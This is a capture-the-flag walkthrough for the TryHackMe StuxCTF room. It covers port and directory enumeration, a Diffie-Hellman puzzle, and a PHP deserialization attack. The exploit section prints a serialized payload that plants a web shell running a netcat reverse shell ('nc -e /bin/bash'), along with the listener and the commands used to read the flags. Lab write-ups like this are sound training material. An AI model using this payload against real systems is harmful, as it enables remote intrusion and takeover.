# [StuxCTF](https://tryhackme.com/room/stuxctf)

## Crypto, serealization, priv scalation and more ...

# StuxCTF

## Read user.txt and root.txt

### What is the hidden directory

1. Start by nmap, and gobuster enumeration

```Bash
nmap -p- <IP>
```

- `-p-`: Allow us to scan all 65535 TCP ports

![SCREEN01](https://github.com/user-attachments/assets/2c93ad6d-5704-4759-9c83-a016f3daf596)

```Bash
gobuster dir -u http://<IP> -w /root/Tools/wordlists/dirbuster/directory-list-1.0.txt -x html,php,js,txt
```

- `-u`: Specifies the URL to scan
- `-w`: Specifies the wordlist file used for brute-forcing
- `-x`: Append extensions to each word in the wordlist when searching

![SCREEN02](https://github.com/user-attachments/assets/a4ffb12e-41b3-4bed-9a2c-ec2e24b002fb)

2. We don't have access to the `/.php` and `/.html`. `robots.txt` doesn't have anything interesting, but we have another clue in source of `/index.html`

![SCREEN03](https://github.com/user-attachments/assets/9563170a-6e12-4fb8-82ab-4566ff3717e3)

3. Let's solve this Diffie-Hellman problem in Python to find the secret directory

```Python
p = 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251
g = 7
a = 330
b = 450
gc = 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617

gca = (gc**a) % p
gcab = (gca**b) % p

print str(gcab)[:128]
```

![SCREEN04](https://github.com/user-attachments/assets/94a52092-01f8-4bab-899d-bf139101cc4c)

### user.txt

### root.txt

1. In source of the secret directory we get another hint

![SCREEN05](https://github.com/user-attachments/assets/3de88eca-bae5-4918-a508-85f3b9824f84)

2. When adding `/?file= ` at the end of the secret directory we are getting `File no Exist!` message

![SCREEN06](https://github.com/user-attachments/assets/d7ce6199-8d03-4bc2-a7d5-efdfd72b8567)

3. I have found out that only `index.php` returns something useful

![SCREEN07](https://github.com/user-attachments/assets/c8159ff5-e8d9-491e-a783-b3e0356dd4f2)

4. Let's put it in the [CyberChef](<https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Reverse('Character')From_Base64('A-Za-z0-9%2B/%3D',true,false)>) and select `From Hex` -> `Reverse` -> `From Base64`. This is our encrypted `index.php`

5. Prepare reverse shell in php and cast it to the .txt file

```php
<?php
class file
{
 public $file = 'shell.php';
 public $data = '<?php shell_exec("nc -e /bin/bash <IP> 4444"); ?>';
}

echo (serialize(new file));

?>
```

```Bash
php shell.php > shell.txt

```

6. Start python server and netcat listener

```Bash
python -m SimpleHTTPServer 9000
```

```Bash
nc -lvnp 4444
```

7. Upload our txt file using `/?file=http://<IP>:9000/shell.txt` and go to the `/<SECRET_DIRECTORY>/shell.php` endpoint. When we get a connection we can get all the flags

```Bash
whoami
sudo -l
cat /home/grecia/user.txt
sudo cat /root/root.txt
```

![SCREEN08](https://github.com/user-attachments/assets/5b9e5bcd-a10d-4e56-8c60-e347aa53bfa6)
